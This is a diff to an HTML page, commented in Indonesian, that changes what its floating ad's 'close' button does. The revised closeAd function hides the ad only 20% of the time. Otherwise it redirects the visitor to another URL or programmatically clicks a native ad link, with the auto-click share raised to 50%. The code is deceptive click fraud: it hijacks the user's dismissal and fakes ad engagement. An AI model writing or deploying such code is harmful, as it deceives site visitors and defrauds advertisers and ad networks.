@@ -90,12 +90,6 @@
       cursor: pointer;
       z-index: 10000;
     }
-
-    @media (max-width: 320px) {
-      .floating-ad {
-        transform: scale(0.9) translateX(-55%);
-      }
-    }
   </style>
 </head>
 <body>
@@ -123,20 +117,20 @@
     function closeAd() {
       const rand = Math.random();
 
-      if (rand < 0.4) {
-        // 40% Redirect ke URL
+      if (rand < 0.3) {
+        // 30% Redirect
         window.location.href = 'https://example.com/redirect-url';
       } else if (rand < 0.8) {
-        // 40% Menutup iklan biasa
-        document.getElementById('floatingAd').style.display = 'none';
-      } else {
-        // 20% Klik otomatis pada iklan native
-        const nativeAd = document.querySelector('#container-5ab5cb4a426fa3a03ae3d3a0b86e52cc a');
-        if (nativeAd) {
-          nativeAd.click();
+        // 50% Klik otomatis iklan
+        const ad = document.querySelector('#container-5ab5cb4a426fa3a03ae3d3a0b86e52cc a');
+        if (ad) {
+          ad.click();
         } else {
           document.getElementById('floatingAd').style.display = 'none';
         }
+      } else {
+        // 20% Menutup iklan
+        document.getElementById('floatingAd').style.display = 'none';
       }
     }
   </script>
